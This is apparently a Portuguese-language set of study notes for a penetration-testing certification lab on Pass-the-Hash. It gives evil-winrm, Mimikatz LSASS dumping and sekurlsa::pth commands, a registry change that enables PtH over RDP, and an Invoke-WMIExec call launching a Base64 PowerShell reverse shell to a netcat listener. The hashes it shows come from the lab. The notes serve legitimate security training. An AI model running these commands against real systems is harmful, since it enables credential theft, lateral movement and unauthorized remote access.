> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/pass-the-hash-pth/questions.md).

# Questions

1. Acesse a máquina alvo usando qualquer ferramenta Pass-the-Hash. Envie o conteúdo do arquivo localizado em C:\pth.txt.

* **Pass the Hash with evil-winrm (Linux)**

```
evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FCdwOPTCgHL9rS0WmbtAE%2Fimage.png?alt=media&amp;token=422f929f-867b-4a14-956e-00375020ab9f" alt=""><figcaption></figcaption></figure>

***

2. Tente conectar-se via RDP usando o hash de Administrador. Qual é o nome do valor do registro que deve ser definido como 0 para que o PTH sobre RDP funcione? Altere o valor da chave do registro e conecte-se usando o hash com o RDP. Envie o nome do valor do registro como resposta.

* Na mesma conexão com o evil-winrm, podemos desativar o modo restrito e tentar o RDP

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

***

3. Conecte-se via RDP e use o Mimikatz, localizado em c:\tools, para extrair os hashes presentes na sessão atual. Qual é o hash NTLM/RC4 da conta de David?

* Dump LSASS:

```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2F4jlp711m5dfT7VwzREOy%2Fimage.png?alt=media&amp;token=121450c3-9349-415c-affa-5037b6c6a84c" alt=""><figcaption></figcaption></figure>

***

4. Utilizando o hash de David, realize um ataque Pass the Hash para conectar-se à pasta compartilhada \DC01\david e ler o arquivo david.txt.

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

* Na abertura de um novo terminal, busque pelo arquivo

```
type \\dc01\david\david.txt
```

* O processo é o mesmo para a pergunta 5

***

5. Usando o hash de Julio, execute um ataque Pass the Hash, abra um console do PowerShell e importe o cmdlet Invoke-TheHash para criar um shell reverso na máquina à qual você está conectado via RDP (a máquina alvo, DC01, só pode se conectar à MS01). Use a ferramenta nc.exe localizada em c:\tools para monitorar o shell reverso. Uma vez conectado à DC01, leia a flag em C:\julio\flag.txt.

* Imagine um cenário, basicamente tu já tens acesso ao MS01, que seria a nossa janela A, e você pretende chegar ao DC01, janela B
* Na *janela B* : Execute o ouvinte netcat, que aguardará o shell reverso vindo do DC01.

```
.\nc.exe -lvp 4444
```

* Antes de criar o payload, verifiquei as interfaces de rede do MS01 com o ipconfig.
* O próximo passo é gerar um payload de shell reverso em PowerShell. Para isso, acesse: [**https://www.revshells.com**](https://www.revshells.com/) **e** escolha:
* LHOST: **172.16.1.5** (seu IP MS01)
* LPORT: **4444**

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FsZuZk3YtmWM4UiHRbavy%2Fimage.png?alt=media&amp;token=34af0f16-30c6-432e-bd94-6ce8f5f5c53b" alt=""><figcaption></figcaption></figure>

* De volta à pasta Invoke-TheHash, carreguei o módulo com Import-Module .\Invoke-TheHash.psd1 e, em seguida, usei o WMIExec para executar um comando no DC01, passando o hash NTLM de Julio para autenticação. O comando que executei foi o payload do PowerShell em Base64.

```
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <Base64 blob>"
```

* O Invoke-TheHash informou que o comando foi executado no DC01, o que significa que o shell reverso deve se reconectar imediatamente.
* Volte para a Janela B (Netcat). Seu shell reverso deverá aparecer lá:

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2Fhw6d7wIXkSOEkKwu5DaW%2Fimage.png?alt=media&amp;token=ed3a3fe2-248e-4ec8-940f-a2d9a718809d" alt=""><figcaption></figcaption></figure>

***

6. Opcional: John é membro do grupo Usuários de Gerenciamento Remoto do MS01. Tente conectar-se ao MS01 usando o hash da conta de John com o impacket. Qual o resultado? O que acontece se você usar o evil-winrm? Marque como CONCLUÍDO ao terminar.

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2Fqme0BS3g0VIF2LugZ0X5%2Fimage.png?alt=media&amp;token=80d0000e-6947-4b14-b67a-ff0930b86f34" alt=""><figcaption></figcaption></figure>
